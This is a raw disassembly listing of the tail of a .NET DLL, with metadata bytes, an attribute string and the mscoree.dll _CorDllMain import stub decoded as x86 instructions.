100089bf:	7d 08                	jge    0x100089c9
100089c1:	08 08                	or     %cl,(%eax)
100089c3:	08 05 20 01 01 11    	or     %al,0x11010120
100089c9:	7d 0a                	jge    0x100089d5
100089cb:	20 05 01 12 80 a1    	and    %al,0xa1801201
100089d1:	08 08                	or     %cl,(%eax)
100089d3:	08 08                	or     %cl,(%eax)
100089d5:	0e                   	push   %cs
100089d6:	07                   	pop    %es
100089d7:	0a 08                	or     (%eax),%cl
100089d9:	08 08                	or     %cl,(%eax)
100089db:	08 08                	or     %cl,(%eax)
100089dd:	0d 08 08 08 12       	or     $0x12080808,%eax
100089e2:	80 9d 07 00 02 11 7d 	sbbb   $0x7d,0x11020007(%ebp)
100089e9:	08 11                	or     %dl,(%ecx)
100089eb:	7d 06                	jge    0x100089f3
100089ed:	20 02                	and    %al,(%edx)
100089ef:	01 11                	add    %edx,(%ecx)
100089f1:	7d 0c                	jge    0x100089ff
100089f3:	0a 20                	or     (%eax),%ah
100089f5:	05 01 12 80 a9       	add    $0xa9801201,%eax
100089fa:	08 08                	or     %cl,(%eax)
100089fc:	08 08                	or     %cl,(%eax)
100089fe:	06                   	push   %es
100089ff:	20 01                	and    %al,(%ecx)
10008a01:	01 11                	add    %edx,(%ecx)
10008a03:	80 ad 0c 20 07 01 12 	subb   $0x12,0x107200c(%ebp)
10008a0a:	80 a9 0c 0c 0c 0c 0c 	subb   $0xc,0xc0c0c0c(%ecx)
10008a11:	0c 0d                	or     $0xd,%al
10008a13:	07                   	pop    %es
10008a14:	07                   	pop    %es
10008a15:	08 08                	or     %cl,(%eax)
10008a17:	08 08                	or     %cl,(%eax)
10008a19:	12 80 a9 12 80 a9    	adc    -0x567fed57(%eax),%al
10008a1f:	0c 05                	or     $0x5,%al
10008a21:	00 02                	add    %al,(%edx)
10008a23:	0e                   	push   %cs
10008a24:	1c 1c                	sbb    $0x1c,%al
10008a26:	03 20                	add    (%eax),%esp
10008a28:	00 18                	add    %bl,(%eax)
10008a2a:	06                   	push   %es
10008a2b:	00 03                	add    %al,(%ebx)
10008a2d:	0e                   	push   %cs
10008a2e:	1c 1c                	sbb    $0x1c,%al
10008a30:	1c 07                	sbb    $0x7,%al
10008a32:	00 03                	add    %al,(%ebx)
10008a34:	11 7d 08             	adc    %edi,0x8(%ebp)
10008a37:	08 08                	or     %cl,(%eax)
10008a39:	04 00                	add    $0x0,%al
10008a3b:	00 11                	add    %dl,(%ecx)
10008a3d:	7d 05                	jge    0x10008a44
10008a3f:	00 00                	add    %al,(%eax)
10008a41:	11 80 b1 04 20 01    	adc    %eax,0x12004b1(%eax)
10008a47:	0e                   	push   %cs
10008a48:	0e                   	push   %cs
10008a49:	07                   	pop    %es
10008a4a:	00 04 0e             	add    %al,(%esi,%ecx,1)
10008a4d:	0e                   	push   %cs
10008a4e:	0e                   	push   %cs
10008a4f:	0e                   	push   %cs
10008a50:	0e                   	push   %cs
10008a51:	06                   	push   %es
10008a52:	20 01                	and    %al,(%ecx)
10008a54:	1d 0e 1d 03 05       	sbb    $0x5031d0e,%eax
10008a59:	00 01                	add    %al,(%ecx)
10008a5b:	0e                   	push   %cs
10008a5c:	1d 0e 06 00 03       	sbb    $0x300060e,%eax
10008a61:	0e                   	push   %cs
10008a62:	0e                   	push   %cs
10008a63:	0e                   	push   %cs
10008a64:	0e                   	push   %cs
10008a65:	10 07                	adc    %al,(%edi)
10008a67:	09 08                	or     %ecx,(%eax)
10008a69:	08 08                	or     %cl,(%eax)
10008a6b:	08 0e                	or     %cl,(%esi)
10008a6d:	1d 0e 11 80 b1       	sbb    $0xb180110e,%eax
10008a72:	1d 03 1d 0e 05       	sbb    $0x50e1d03,%eax
10008a77:	00 00                	add    %al,(%eax)
10008a79:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
10008a7f:	11 80 b9 05 00 00    	adc    %eax,0x5b9(%eax)
10008a85:	11 80 b9 0c 07 06    	adc    %eax,0x6070cb9(%eax)
10008a8b:	11 80 b9 11 80 b9    	adc    %eax,-0x467fee47(%eax)
10008a91:	08 08                	or     %cl,(%eax)
10008a93:	08 08                	or     %cl,(%eax)
10008a95:	09 07                	or     %eax,(%edi)
10008a97:	03 11                	add    (%ecx),%edx
10008a99:	80 b9 11 80 b9 08 06 	cmpb   $0x6,0x8b98011(%ecx)
10008aa0:	20 01                	and    %al,(%ecx)
10008aa2:	01 11                	add    %edx,(%ecx)
10008aa4:	80 c5 06             	add    $0x6,%ch
10008aa7:	20 01                	and    %al,(%ecx)
10008aa9:	01 11                	add    %edx,(%ecx)
10008aab:	80 c9 05             	or     $0x5,%cl
10008aae:	20 02                	and    %al,(%edx)
10008ab0:	01 08                	add    %ecx,(%eax)
10008ab2:	08 06                	or     %al,(%esi)
10008ab4:	20 01                	and    %al,(%ecx)
10008ab6:	01 11                	add    %edx,(%ecx)
10008ab8:	80 cd 06             	or     $0x6,%ch
10008abb:	20 01                	and    %al,(%ecx)
10008abd:	01 11                	add    %edx,(%ecx)
10008abf:	80 d1 06             	adc    $0x6,%cl
10008ac2:	20 01                	and    %al,(%ecx)
10008ac4:	01 12                	add    %edx,(%edx)
10008ac6:	80 d5 05             	adc    $0x5,%ch
10008ac9:	20 00                	and    %al,(%eax)
10008acb:	12 80 d9 06 20 01    	adc    0x12006d9(%eax),%al
10008ad1:	01 12                	add    %edx,(%edx)
10008ad3:	80 95 05 20 02 01 0e 	adcb   $0xe,0x1022005(%ebp)
10008ada:	0c 06                	or     $0x6,%al
10008adc:	20 01                	and    %al,(%ecx)
10008ade:	01 12                	add    %edx,(%edx)
10008ae0:	80 dd 08             	sbb    $0x8,%ch
10008ae3:	20 03                	and    %al,(%ebx)
10008ae5:	01 0e                	add    %ecx,(%esi)
10008ae7:	0c 11                	or     $0x11,%al
10008ae9:	80 e1 06             	and    $0x6,%cl
10008aec:	20 01                	and    %al,(%ecx)
10008aee:	01 11                	add    %edx,(%ecx)
10008af0:	80 e5 06             	and    $0x6,%ch
10008af3:	20 01                	and    %al,(%ecx)
10008af5:	01 12                	add    %edx,(%edx)
10008af7:	80 89 02 1d 0e 05 00 	orb    $0x0,0x50e1d02(%ecx)
10008afe:	00 12                	add    %dl,(%edx)
10008b00:	80 f1 05             	xor    $0x5,%cl
10008b03:	00 02                	add    %al,(%edx)
10008b05:	0e                   	push   %cs
10008b06:	0e                   	push   %cs
10008b07:	0e                   	push   %cs
10008b08:	06                   	push   %es
10008b09:	20 01                	and    %al,(%ecx)
10008b0b:	01 11                	add    %edx,(%ecx)
10008b0d:	80 f5 06             	xor    $0x6,%ch
10008b10:	20 01                	and    %al,(%ecx)
10008b12:	01 12                	add    %edx,(%edx)
10008b14:	80 85 05 00 01 01 12 	addb   $0x12,0x1010005(%ebp)
10008b1b:	1d 7a 07 40 11       	sbb    $0x1140077a,%eax
10008b20:	80 b9 11 80 b9 08 08 	cmpb   $0x8,0x8b98011(%ecx)
10008b27:	0e                   	push   %cs
10008b28:	11 7d 11             	adc    %edi,0x11(%ebp)
10008b2b:	7d 11                	jge    0x10008b3e
10008b2d:	80 b9 11 80 b9 08 08 	cmpb   $0x8,0x8b98011(%ecx)
10008b34:	08 08                	or     %cl,(%eax)
10008b36:	08 08                	or     %cl,(%eax)
10008b38:	12 6d 12             	adc    0x12(%ebp),%ch
10008b3b:	71 12                	jno    0x10008b4f
10008b3d:	80 ed 0e             	sub    $0xe,%ch
10008b40:	11 7d 11             	adc    %edi,0x11(%ebp)
10008b43:	7d 11                	jge    0x10008b56
10008b45:	7d 11                	jge    0x10008b58
10008b47:	80 b9 11 80 b9 08 08 	cmpb   $0x8,0x8b98011(%ecx)
10008b4e:	08 12                	or     %dl,(%edx)
10008b50:	6d                   	insl   (%dx),%es:(%edi)
10008b51:	12 71 12             	adc    0x12(%ecx),%dh
10008b54:	71 12                	jno    0x10008b68
10008b56:	6d                   	insl   (%dx),%es:(%edi)
10008b57:	12 71 12             	adc    0x12(%ecx),%dh
10008b5a:	71 08                	jno    0x10008b64
10008b5c:	08 08                	or     %cl,(%eax)
10008b5e:	08 1d 12 71 1d 0e    	or     %bl,0xe1d7112
10008b64:	08 12                	or     %dl,(%edx)
10008b66:	6d                   	insl   (%dx),%es:(%edi)
10008b67:	12 71 12             	adc    0x12(%ecx),%dh
10008b6a:	71 12                	jno    0x10008b7e
10008b6c:	71 12                	jno    0x10008b80
10008b6e:	71 12                	jno    0x10008b82
10008b70:	71 12                	jno    0x10008b84
10008b72:	6d                   	insl   (%dx),%es:(%edi)
10008b73:	12 6d 08             	adc    0x8(%ebp),%ch
10008b76:	12 6d 12             	adc    0x12(%ebp),%ch
10008b79:	71 12                	jno    0x10008b8d
10008b7b:	80 ed 12             	sub    $0x12,%ch
10008b7e:	28 12                	sub    %dl,(%edx)
10008b80:	80 ed 12             	sub    $0x12,%ch
10008b83:	80 d5 12             	adc    $0x12,%ch
10008b86:	80 d5 12             	adc    $0x12,%ch
10008b89:	24 08                	and    $0x8,%al
10008b8b:	08 1d 0e 08 1d 1d    	or     %bl,0x1d1d080e
10008b91:	0e                   	push   %cs
10008b92:	11 80 b1 1d 08 06    	adc    %eax,0x6081db1(%eax)
10008b98:	20 01                	and    %al,(%ecx)
10008b9a:	01 11                	add    %edx,(%ecx)
10008b9c:	80 fd 04             	cmp    $0x4,%ch
10008b9f:	06                   	push   %es
10008ba0:	12 81 01 03 20 00    	adc    0x200301(%ecx),%al
10008ba6:	02 08                	add    (%eax),%cl
10008ba8:	20 01                	and    %al,(%ecx)
10008baa:	12 81 05 12 81 09    	adc    0x9811205(%ecx),%al
10008bb0:	08 01                	or     %al,(%ecx)
10008bb2:	00 08                	add    %cl,(%eax)
10008bb4:	00 00                	add    %al,(%eax)
10008bb6:	00 00                	add    %al,(%eax)
10008bb8:	00 1e                	add    %bl,(%esi)
10008bba:	01 00                	add    %eax,(%eax)
10008bbc:	01 00                	add    %eax,(%eax)
10008bbe:	54                   	push   %esp
10008bbf:	02 16                	add    (%esi),%dl
10008bc1:	57                   	push   %edi
10008bc2:	72 61                	jb     0x10008c25
10008bc4:	70 4e                	jo     0x10008c14
10008bc6:	6f                   	outsl  %ds:(%esi),(%dx)
10008bc7:	6e                   	outsb  %ds:(%esi),(%dx)
10008bc8:	45                   	inc    %ebp
10008bc9:	78 63                	js     0x10008c2e
10008bcb:	65 70 74             	gs jo  0x10008c42
10008bce:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10008bd5:	77 73                	ja     0x10008c4a
10008bd7:	01 00                	add    %eax,(%eax)
10008bd9:	8c 00                	mov    %es,(%eax)
	...
10008be3:	00 1e                	add    %bl,(%esi)
10008be5:	8c 00                	mov    %es,(%eax)
10008be7:	00 00                	add    %al,(%eax)
10008be9:	20 00                	and    %al,(%eax)
	...
10008bff:	00 10                	add    %dl,(%eax)
10008c01:	8c 00                	mov    %es,(%eax)
	...
10008c0f:	00 00                	add    %al,(%eax)
10008c11:	00 5f 43             	add    %bl,0x43(%edi)
10008c14:	6f                   	outsl  %ds:(%esi),(%dx)
10008c15:	72 44                	jb     0x10008c5b
10008c17:	6c                   	insb   (%dx),%es:(%edi)
10008c18:	6c                   	insb   (%dx),%es:(%edi)
10008c19:	4d                   	dec    %ebp
10008c1a:	61                   	popa
10008c1b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
10008c22:	72 65                	jb     0x10008c89
10008c24:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
10008c28:	6c                   	insb   (%dx),%es:(%edi)
10008c29:	00 00                	add    %al,(%eax)
10008c2b:	00 00                	add    %al,(%eax)
10008c2d:	00 ff                	add    %bh,%bh
10008c2f:	25 00 20 00 10       	and    $0x10002000,%eax
